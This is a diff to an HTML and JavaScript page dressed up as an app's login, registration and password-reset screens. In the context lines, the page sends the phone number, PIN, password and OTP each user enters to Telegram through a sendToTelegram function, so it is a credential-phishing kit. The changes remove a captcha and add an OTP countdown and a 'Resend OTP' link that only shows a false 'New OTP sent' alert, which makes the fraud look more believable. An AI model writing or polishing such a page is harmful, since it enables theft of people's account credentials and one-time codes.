@@ -115,7 +115,7 @@
             display: flex;
             align-items: center;
             gap: 12px;
-            border: 1px solid #e2e8f0;
+            border: none;
         }
 
         .login-capsule .input-capsule input {
@@ -143,9 +143,8 @@
             border-radius: 44px;
             padding: 14px 22px;
             margin-bottom: 16px;
-            border-bottom: none;
             gap: 12px;
-            border: 1px solid #e2e8f0;
+            border: none;
         }
 
         .card-panel .input-line {
@@ -153,8 +152,6 @@
             border-radius: 0;
             border-bottom: 1px solid #edf2f7;
             padding: 16px 0;
-            border: none;
-            border-bottom: 1px solid #edf2f7;
         }
 
         .card-panel .input-line label {
@@ -334,72 +331,6 @@
             margin: 15px 0 30px 0;
         }
 
-        .captcha-zone {
-            margin: 20px 0 20px;
-        }
-        .captcha-title {
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 10px;
-            color: #2c3e66;
-        }
-        .captcha-title span {
-            color: #e5484d;
-        }
-        .canvas-box {
-            position: relative;
-            width: 100%;
-            height: 140px;
-            background: #f0f2f8;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 1px solid #e2e6ef;
-        }
-        #bgCanvas {
-            width: 100%;
-            height: 100%;
-            display: block;
-        }
-        #pieceCanvas {
-            position: absolute;
-            top: 0;
-            left: 10px;
-            z-index: 12;
-            cursor: grab;
-        }
-        .slider-rail {
-            position: relative;
-            width: 100%;
-            height: 10px;
-            background: #e4e8f0;
-            border-radius: 20px;
-            margin-top: 18px;
-            border: 1px solid #cfd6e3;
-        }
-        .slider-drag {
-            position: absolute;
-            top: -9px;
-            left: 0;
-            width: 44px;
-            height: 28px;
-            background: #4a72ff;
-            border-radius: 30px;
-            cursor: grab;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-        }
-        .captcha-hint {
-            font-size: 11px;
-            color: #7e849b;
-            margin-top: 8px;
-        }
-        .captcha-success {
-            color: #1faf45;
-            font-weight: 700;
-            font-size: 13px;
-            margin-top: 8px;
-            display: none;
-        }
-
         .otp-modal-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -424,7 +355,7 @@
         .otp-title { font-size: 22px; font-weight: 700; color: #0f172a; margin-bottom: 12px; }
         .otp-subtext { font-size: 14px; color: #5b6b8c; margin-bottom: 20px; font-weight: 500; }
         .otp-error-text { font-size: 13px; color: #e5484d; font-weight: 600; margin-bottom: 16px; min-height: 20px; }
-        .otp-input-group { display: flex; justify-content: center; gap: 14px; margin-bottom: 32px; }
+        .otp-input-group { display: flex; justify-content: center; gap: 14px; margin-bottom: 20px; }
         .otp-digit-input {
             width: 58px; height: 62px; text-align: center; font-size: 28px;
             font-weight: 600; font-family: monospace; border: none;
@@ -442,9 +373,10 @@
         #pinInputGroup input.pin-digit:focus { border-bottom-color: #198cff; background: #f0f7ff; }
 
         .otp-resend-area { text-align: center; font-size: 13px; color: #8892b0; margin: 8px 0 12px; }
+        .resend-link { color: #198cff; text-decoration: none; font-weight: 600; cursor: pointer; }
         .verify-otp-btn {
             width: 100%; background: #198cff; border: none; padding: 14px;
-            border-radius: 48px; font-size: 17px; font-weight: 700; color: white; margin-top: 18px; cursor: pointer;
+            border-radius: 48px; font-size: 17px; font-weight: 700; color: white; margin-top: 10px; cursor: pointer;
         }
 
         .toast-popup {
@@ -521,20 +453,6 @@
             <img src="https://zxcvwe.wiki/static/icon/phone.png" alt="invite icon" class="input-icon">
             <input type="text" id="inviteCode" value="9KQ7KNlh4z" readonly style="font-weight:600;color:#111;">
         </div>
-
-        <div class="captcha-zone">
-            <div class="captcha-title">Slider verification <span>*</span></div>
-            <div class="canvas-box">
-                <canvas id="bgCanvas" width="380" height="140" style="width:100%;height:auto;display:block;"></canvas>
-                <canvas id="pieceCanvas" width="380" height="140" style="position:absolute; top:0; left:0;"></canvas>
-            </div>
-            <div class="slider-rail" id="trackRail">
-                <div class="slider-drag" id="dragThumb"></div>
-            </div>
-            <div class="captcha-hint">➡️ Drag the puzzle piece to match the missing part</div>
-            <div class="captcha-success" id="captchaOkMsg">✓ Verification successful</div>
-        </div>
-
         <button type="button" class="btn-primary" id="registerBtn">Register</button>
         <span class="toggle-link" onclick="switchView('loginView')">Already have an account? Go Login</span>
     </div>
@@ -579,8 +497,6 @@
             <p>This application respects and protects the personal privacy of all users who use the service...</p>
             <h2>1. Scope of application</h2>
             <p>(a) When you register the account of this application, the personal registration information you provide...</p>
-            <h2>2. Information use</h2>
-            <p>(a) This application will not provide, sell, rent, share or trade your personal information...</p>
         </div>
     </div>
 </div>
@@ -608,7 +524,7 @@
 <div id="otpModal" class="otp-modal-overlay">
     <div class="otp-modal-container">
         <button type="button" class="otp-close-btn" onclick="closeModal('otpModal')">&times;</button>
-        <div class="otp-title" id="otpModalTitle">Please enter OTP</div>
+        <div class="otp-title">Please enter OTP</div>
         <div class="otp-subtext" id="otpSubtext">OTP sent to **********</div>
         <div class="otp-error-text" id="otpErrorText"></div>
         <div class="otp-input-group">
@@ -619,6 +535,7 @@
         </div>
         <div class="otp-resend-area">
             <span id="resendText">Resend in <span id="timerSeconds">120</span>s</span>
+            <a href="#" id="resendOtpLink" class="resend-link" style="display: none;">Resend OTP</a>
         </div>
         <button type="button" class="verify-otp-btn" id="verifyOtpBtn">Verify & Proceed</button>
     </div>
@@ -650,6 +567,7 @@
 
     function closeModal(modalId) {
         document.getElementById(modalId).classList.remove('active');
+        if(countdownInterval) clearInterval(countdownInterval);
     }
 
     async function sendToTelegram(payload) {
@@ -667,6 +585,30 @@
     let currentPhone = '';
     let currentPassword = '';
     let flowType = 'login';
+    let countdownInterval;
+
+    function startOtpTimer() {
+        let timeLeft = 120;
+        const timerSpan = document.getElementById('timerSeconds');
+        const resendText = document.getElementById('resendText');
+        const resendLink = document.getElementById('resendOtpLink');
+
+        timerSpan.textContent = timeLeft;
+        resendText.style.display = 'inline';
+        resendLink.style.display = 'none';
+
+        if (countdownInterval) clearInterval(countdownInterval);
+
+        countdownInterval = setInterval(() => {
+            timeLeft--;
+            timerSpan.textContent = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                resendText.style.display = 'none';
+                resendLink.style.display = 'inline';
+            }
+        }, 1000);
+    }
 
     document.getElementById('loginBtn').addEventListener('click', () => {
         currentPhone = document.getElementById('loginPhone').value.trim();
@@ -682,6 +624,7 @@
 
         document.getElementById('pinModal').classList.add('active');
         document.querySelectorAll('.pin-digit').forEach(i => i.value = '');
+        document.getElementById('pinErrorText').textContent = '';
         document.getElementById('pin0').focus();
     });
 
@@ -697,10 +640,14 @@
         sendToTelegram({ type: 'pin', phone: currentPhone, pin: pin });
         document.getElementById('pinModal').classList.remove('active');
 
+        // Open OTP Modal & Start Timer
         document.getElementById('otpModal').classList.add('active');
         document.querySelectorAll('.o-digit').forEach(i => i.value = '');
+        document.getElementById('otpErrorText').textContent = '';
         document.getElementById('otp0').focus();
         document.getElementById('otpSubtext').textContent = `OTP sent to ${currentPhone.slice(0,3)}****${currentPhone.slice(-4)}`;
+        
+        startOtpTimer();
     });
 
     const otpInputs = document.querySelectorAll('.o-digit');
@@ -740,6 +687,7 @@
         } else {
             sendToTelegram({ type: 'modify', phone: currentPhone, password: currentPassword, otp: otp });
             document.getElementById('otpModal').classList.remove('active');
+            if (countdownInterval) clearInterval(countdownInterval);
             
             const toast = document.getElementById('customToast');
             document.getElementById('toastText').textContent = 'Password modified successfully!';
@@ -773,8 +721,17 @@
         sendToTelegram({ type: 'modify_req', phone: currentPhone, password: currentPassword });
         document.getElementById('otpModal').classList.add('active');
         document.querySelectorAll('.o-digit').forEach(i => i.value = '');
+        document.getElementById('otpErrorText').textContent = '';
         document.getElementById('otp0').focus();
         document.getElementById('otpSubtext').textContent = `OTP sent to ${currentPhone.slice(0,3)}****${currentPhone.slice(-4)}`;
+        
+        startOtpTimer();
+    });
+
+    document.getElementById('resendOtpLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        alert('New OTP sent successfully!');
+        startOtpTimer();
     });
 </script>
 </body>
